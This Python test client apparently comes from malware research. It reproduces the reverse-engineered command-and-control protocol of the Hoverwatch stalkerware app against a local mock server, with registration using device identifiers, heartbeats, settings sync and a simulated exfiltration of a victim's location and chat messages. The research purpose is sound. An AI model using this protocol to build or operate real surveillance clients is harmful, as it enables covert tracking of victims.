#!/usr/bin/env python3
"""
Test client — simulates Hoverwatch app traffic against the mock C2.
Reproduces the exact protocol extracted from reverse engineering.

Usage:
    uv run python test_client.py [--base-url https://127.0.0.1:8443]
"""

import argparse
import json
import ssl
import urllib.request
import urllib.error
import uuid


def make_request(url: str, method: str = "GET", data: dict | bytes | None = None,
                 headers: dict | None = None, content_type: str | None = None) -> tuple[int, str]:
    """Make HTTP request with no SSL verification (like Hoverwatch)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    if isinstance(data, dict):
        body = json.dumps(data).encode("utf-8")
        content_type = content_type or "application/json"
    elif isinstance(data, bytes):
        body = data
    else:
        body = None

    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "Android Monitor 7.5.369")
    req.add_header("Connection", "Keep-Alive")
    if content_type:
        req.add_header("Content-Type", content_type)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return -1, str(e)


def test_registration(base: str) -> str | None:
    """Step 1: Register device."""
    print("\n" + "=" * 60)
    print("📱 STEP 1 — Registration")
    print("=" * 60)

    payload = {
        "username": "test@evil.com",
        "password": "P@ssw0rd",
        "hid": f"and:{uuid.uuid4().hex[:16]}",
        "device_name": "Samsung Galaxy S23",
        "client_ver": "7.5.369",
        "os_ver": "13",
        "user_type": 0,
        "device.dev_mac_adr_str": "AA:BB:CC:DD:EE:FF",
        "device.dev_imei_str": "353456789012345",
        "device.dev_accounts_str": "victim@gmail.com",
        "device.perm_101": 1,
        "device.perm_102": 1,
        "device.perm_103": 1,
        "device.perm_116": 1,
        "device.perm_118": 1,
        "device.perm_121": 1,
        "device.perm_128": 1,
        "device.perm_129": 1,
        "device.perm_130": 1,
    }

    code, resp = make_request(f"{base}/api/online/registration/", "POST", payload)
    print(f"  HTTP {code}")

    try:
        data = json.loads(resp)
        print(f"  status:        {data.get('status')}")
        print(f"  auth_key:      {data.get('auth_key')}")
        print(f"  valid_through: {data.get('valid_through')}")
        print(f"  subscription:  {data.get('subscription')}")
        print(f"  domains:       {data.get('domains')}")
        print(f"  client_pin:    {data.get('client_pin')}")
        if data.get("settings"):
            print(f"  settings ver:  {data['settings'].get('version')}")
        return data.get("auth_key")
    except json.JSONDecodeError:
        print(f"  Raw: {resp[:200]}")
        return None


def test_check(base: str, auth_key: str):
    """Step 2: Heartbeat / ping."""
    print("\n" + "=" * 60)
    print("💓 STEP 2 — Heartbeat (check)")
    print("=" * 60)

    code, resp = make_request(
        f"{base}/api/online/check/", "POST",
        headers={"x-auth-key": auth_key},
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_update_check(base: str):
    """Step 3: Check for updates."""
    print("\n" + "=" * 60)
    print("📦 STEP 3 — Update check")
    print("=" * 60)

    code, resp = make_request(f"{base}/api/online/programversion/HWA/")
    print(f"  HTTP {code} — {resp[:100]}")


def test_send_settings(base: str, auth_key: str):
    """Step 4: Sync with settings header."""
    print("\n" + "=" * 60)
    print("⚙️ STEP 4 — Sync (settings exchange)")
    print("=" * 60)

    code, resp = make_request(
        f"{base}/api/online/check/", "POST",
        headers={
            "x-auth-key": auth_key,
            "x-settings-ver": "99",
        },
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_send_logs(base: str, auth_key: str):
    """Step 5: Send exfiltrated data (simulated)."""
    print("\n" + "=" * 60)
    print("📡 STEP 5 — Exfiltrate data (logs)")
    print("=" * 60)

    # Simulate a protobuf-like payload with embedded JSON
    fake_location = json.dumps({
        "loc": {
            "cat": 1,
            "crd": [48.8566, 2.3522],
            "acc": 15.0,
            "spd": 5.4,
            "ssid": "VictimWiFi",
            "bssid": "AA:BB:CC:DD:EE:FF",
        }
    }).encode("utf-8")

    fake_im = json.dumps({
        "N": 1,
        "time": 1712000000000,
        "from": "Alice",
        "text": "[MOCK] Hey, where are you?",
        "type": 0,
        "direct": 1,
    }).encode("utf-8")

    # Wrap in a minimal protobuf-like container (simplified)
    payload = b"\x00\x01" + len(fake_location).to_bytes(2, "big") + fake_location
    payload += b"\x00\x02" + len(fake_im).to_bytes(2, "big") + fake_im

    code, resp = make_request(
        f"{base}/api/online/logs/", "POST", payload,
        headers={
            "x-auth-key": auth_key,
            "Content-Length": str(len(payload)),
        },
    )
    print(f"  HTTP {code} — {resp[:100]}")
    print(f"  Sent {len(payload)} bytes (location + IM message)")


def test_exception_log(base: str, auth_key: str):
    """Step 6: Send exception log."""
    print("\n" + "=" * 60)
    print("🐛 STEP 6 — Exception log")
    print("=" * 60)

    payload = json.dumps({
        "error": "java.lang.NullPointerException",
        "stack": "at p094hw.utils.ServiceCore.onStartCommand(ServiceCore.java:42)",
    }).encode("utf-8")

    code, resp = make_request(
        f"{base}/api/online/exceptionlog/", "POST", payload,
        headers={"x-auth-key": auth_key},
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_dashboard(base: str):
    """Check the dashboard."""
    print("\n" + "=" * 60)
    print("📊 DASHBOARD")
    print("=" * 60)

    code, resp = make_request(f"{base}/")
    try:
        data = json.loads(resp)
        print(f"  Registered devices: {data.get('registered_devices')}")
        print(f"  Exfiltrated payloads: {data.get('exfiltrated_payloads')}")
        for d in data.get("devices", []):
            print(f"    → {d['username']} / {d['device_name']} / {d['imei']} (auth: {d['auth_key'][:20]}...)")
    except json.JSONDecodeError:
        print(f"  Raw: {resp[:200]}")


def main():
    parser = argparse.ArgumentParser(description="Hoverwatch Mock C2 — Test Client")
    parser.add_argument("--base-url", default="https://127.0.0.1:8443", help="Base URL of mock C2")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    print(f"🎯 Testing mock C2 at {base}")

    # Full protocol simulation
    auth_key = test_registration(base)
    if not auth_key:
        print("❌ Registration failed, aborting")
        return

    test_check(base, auth_key)
    test_update_check(base)
    test_send_settings(base, auth_key)
    test_send_logs(base, auth_key)
    test_exception_log(base, auth_key)
    test_dashboard(base)

    print("\n" + "=" * 60)
    print("✅ All protocol steps completed successfully")
    print("=" * 60)
    print(f"\nLogs saved in: {base.replace('https://', '').replace('http://', '')} → logs/")


if __name__ == "__main__":
    main()
